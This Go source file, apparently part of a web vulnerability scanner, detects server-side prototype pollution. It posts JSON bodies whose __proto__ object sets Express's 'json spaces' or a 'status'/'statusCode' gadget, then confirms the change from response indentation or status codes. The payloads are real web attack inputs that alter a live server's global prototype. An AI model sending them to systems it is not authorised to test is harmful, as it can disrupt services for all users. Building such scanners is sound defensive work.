package scanner

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

// prototypeBehavioralProof detects SERVER-SIDE prototype pollution that is NOT
// reflected anywhere — the common, high-value case prototypeJSONProof (which
// needs the polluted marker to echo back) structurally misses. It pollutes a
// known server-behavior GADGET on Object.prototype and confirms by an observable,
// differential change in the HTTP response, then a clean control that REVERTS it.
//
// Two gadgets, both from the canonical Node/Express SSPP methodology:
//
//   - "json spaces": Express reads app.get('json spaces') off the prototype when
//     serialising a JSON response. Polluting it to N makes res.json() indent with
//     N spaces. We send N=9 then N=7 (odd, uncommon widths) and require the
//     response to switch from compact to indented by EXACTLY that width each time,
//     and a clean request to be compact again. An indentation width that tracks an
//     injected odd number, appears only under pollution, and reverts cannot be
//     produced by chance — zero false positives.
//   - "status": many frameworks read a status/statusCode gadget; polluting it to an
//     uncommon code (599) that the endpoint does not otherwise return, then seeing
//     it revert on a clean request, proves prototype mutation reached response
//     construction.
//
// Fires at most one confirmed finding per insertion point (json-spaces preferred).
func prototypeBehavioralProof(ctx context.Context, ip insertionPoint, auth map[string]string) (payload, evidence, method string, confidence int) {
	if p, e := prototypeJSONSpacesProof(ctx, ip, auth); e != "" {
		return p, e, "sspp-json-spaces-differential", ConfPoC
	}
	if p, e := prototypeStatusProof(ctx, ip, auth); e != "" {
		return p, e, "sspp-status-override-differential", ConfPoC
	}
	return "", "", "", 0
}

// prototypeJSONSpacesProof confirms the "json spaces" indentation gadget.
func prototypeJSONSpacesProof(ctx context.Context, ip insertionPoint, auth map[string]string) (string, string) {
	// Baseline (clean) must be a JSON object response that is COMPACT — otherwise
	// an indentation differential proves nothing.
	cleanBody, ok := buildPrototypeJSONBody(ip, "", nil)
	if !ok {
		return "", ""
	}
	base, baseOK := prototypeSendJSON(ctx, ip, auth, cleanBody)
	if !baseOK || !base.isJSONObject || base.indentWidth != 0 {
		return "", ""
	}

	confirmedPayload := ""
	for _, width := range []int{9, 7} { // odd, uncommon widths; both must track
		body, ok := buildPrototypeGadgetBody(ip, map[string]any{"json spaces": width})
		if !ok {
			return "", ""
		}
		r, sok := prototypeSendJSON(ctx, ip, auth, body)
		if !sok || !r.isJSONObject || r.indentWidth != width {
			return "", ""
		}
		if confirmedPayload == "" {
			confirmedPayload = body
		}
	}

	// Revert: a clean request must return to compact, ruling out a server that
	// started indenting for an unrelated reason mid-test.
	if r, ok := prototypeSendJSON(ctx, ip, auth, cleanBody); !ok || r.indentWidth != 0 {
		return "", ""
	}
	return confirmedPayload, "Server-side prototype pollution confirmed via the Express 'json spaces' gadget: polluting __proto__['json spaces'] to 9 then 7 made the JSON response indent by exactly that many spaces (baseline was compact), and a clean request reverted to compact. No value was reflected — this is a behavioural gadget, not an echo."
}

// prototypeStatusProof confirms the status/statusCode override gadget.
func prototypeStatusProof(ctx context.Context, ip insertionPoint, auth map[string]string) (string, string) {
	cleanBody, ok := buildPrototypeJSONBody(ip, "", nil)
	if !ok {
		return "", ""
	}
	base, baseOK := prototypeSendJSON(ctx, ip, auth, cleanBody)
	if !baseOK {
		return "", ""
	}
	const oddStatus = 599 // not a code these endpoints return in normal operation
	if base.status == oddStatus {
		return "", "" // baseline already returns it → not attributable to pollution
	}
	for _, gadget := range []string{"status", "statusCode"} {
		body, ok := buildPrototypeGadgetBody(ip, map[string]any{gadget: oddStatus})
		if !ok {
			continue
		}
		r, sok := prototypeSendJSON(ctx, ip, auth, body)
		if !sok || r.status != oddStatus {
			continue
		}
		// Double-confirm + revert: a clean request must NOT carry the odd status.
		if rc, ok := prototypeSendJSON(ctx, ip, auth, cleanBody); !ok || rc.status == oddStatus {
			continue
		}
		return body, fmt.Sprintf("Server-side prototype pollution confirmed via the '%s' gadget: polluting __proto__.%s to %d overrode the HTTP response status (baseline %d), and a clean request reverted to a non-%d status. Behavioural gadget, not a reflection.", gadget, gadget, oddStatus, base.status, oddStatus)
	}
	return "", ""
}

// buildPrototypeGadgetBody produces the base JSON body plus a __proto__ object
// carrying the given gadget properties.
func buildPrototypeGadgetBody(ip insertionPoint, gadget map[string]any) (string, bool) {
	fields := make(map[string]string, len(ip.Siblings)+1)
	for name, sibling := range ip.Siblings {
		fields[name] = sibling
	}
	fields[ip.Param] = ip.Value
	base := buildJSONFieldsTyped(fields, ip.SiblingTypes, "")
	var object map[string]any
	if json.Unmarshal([]byte(base), &object) != nil {
		return "", false
	}
	object["__proto__"] = gadget
	encoded, err := json.Marshal(object)
	return string(encoded), err == nil
}

type prototypeResp struct {
	status       int
	isJSONObject bool
	indentWidth  int // leading spaces before the first nested key; 0 = compact
}

// prototypeSendJSON POSTs a JSON body and summarises the response for gadget
// analysis (status + JSON-object shape + indentation width).
func prototypeSendJSON(ctx context.Context, ip insertionPoint, auth map[string]string, body string) (prototypeResp, bool) {
	reqCtx, cancel := context.WithTimeout(ctx, 8*time.Second)
	defer cancel()
	req, err := http.NewRequestWithContext(reqCtx, strings.ToUpper(ip.Method), ip.URL, strings.NewReader(body))
	if err != nil {
		return prototypeResp{}, false
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0")
	for name, value := range auth {
		req.Header.Set(name, value)
	}
	resp, err := vulnHTTPClient.Do(req)
	if err != nil {
		return prototypeResp{}, false
	}
	defer resp.Body.Close()
	data, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
	out := prototypeResp{status: resp.StatusCode}
	trimmed := strings.TrimSpace(string(data))
	if strings.HasPrefix(trimmed, "{") && json.Valid([]byte(trimmed)) {
		var obj map[string]any
		if json.Unmarshal([]byte(trimmed), &obj) == nil && len(obj) > 0 {
			out.isJSONObject = true
			out.indentWidth = jsonIndentWidth(trimmed)
		}
	}
	return out, true
}

// jsonIndentWidth returns the number of leading spaces on the first indented
// line of a pretty-printed JSON object (0 for compact single-line JSON). This is
// exactly what res.json() with an "json spaces" setting of N produces (N spaces
// before the first key).
func jsonIndentWidth(s string) int {
	nl := strings.IndexByte(s, '\n')
	if nl < 0 {
		return 0 // compact
	}
	i := nl + 1
	spaces := 0
	for i < len(s) && s[i] == ' ' {
		spaces++
		i++
	}
	return spaces
}
